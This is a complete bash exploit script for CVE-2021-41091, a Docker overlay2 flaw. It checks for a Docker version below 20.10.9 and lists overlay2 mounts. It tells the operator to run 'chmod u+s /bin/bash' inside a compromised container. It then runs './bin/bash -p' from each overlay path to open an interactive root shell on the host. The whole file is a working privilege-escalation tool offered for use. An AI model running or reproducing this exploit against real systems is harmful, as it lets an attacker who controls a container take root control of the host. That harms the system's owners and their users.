#!/bin/bash

docker_version=$(docker --version 2>/dev/null | awk '{print $3}' | sed 's/,//')
if [ -z "$docker_version" ]; then
    echo "[x] Docker not found or an error occurred while checking the version."
    exit 1
fi

IFS='.' read -ra ver_parts <<< "$docker_version"
IFS='.' read -ra min_parts <<< "20.10.9"

is_vulnerable=true
for i in "${!ver_parts[@]}"; do
    if [[ "${ver_parts[i]}" -gt "${min_parts[i]}" ]]; then
        is_vulnerable=false
        break
    elif [[ "${ver_parts[i]}" -lt "${min_parts[i]}" ]]; then
        break
    fi
done

if $is_vulnerable; then
    output=$(findmnt 2>/dev/null)
    result=$(echo "$output" | grep "/var/lib/docker/overlay2" | awk '{print $1}' | sed 's/..//')
    if [[ "$result" =~ "/var/lib/docker/overlay2" ]]; then
        echo "[!] Vulnerable to CVE-2021-41091"
        echo "[!] Now connect to your Docker container that is accessible and obtain root access !"
        echo "[>] After gaining root access execute this command (chmod u+s /bin/bash)"
        echo ""
        read -p "Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): " response
        if [[ "$response" != "yes" ]]; then
            echo "[x] Please set the setuid bit on /bin/bash in the Docker container and try again."
            exit 2
        fi
        echo "[!] Available Overlay2 Filesystems:"
        echo -e "$result\n"
        echo "[!] Iterating over the available Overlay2 filesystems !"
        while read -r path; do
            echo "[?] Checking path: $path"
            if cd "$path" 2>/dev/null; then
                if ./bin/bash -p 2>/dev/null; then
                    echo "[!] Rooted !"
                    echo "[>] Current Vulnerable Path: $(pwd)"
                    echo "[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'"
                    echo ""
                    echo "[!] Spawning Shell"
                    cd "$path"
                    exec ./bin/bash -p -i
                else
                    echo -e "[x] Could not get root access in '$path'\n"
                fi
            else
                echo -e "[x] Could not access or change directory to '$path'\n"
            fi
        done <<< "$result"
    else
        echo "[x] There's no /var/lib/docker/overlay2 files ! Not vulnerable to CVE-2021-41091"
    fi
else
    echo "[x] Docker version is greater or equal to 20.10.9, not vulnerable to CVE-2021-41091"
fi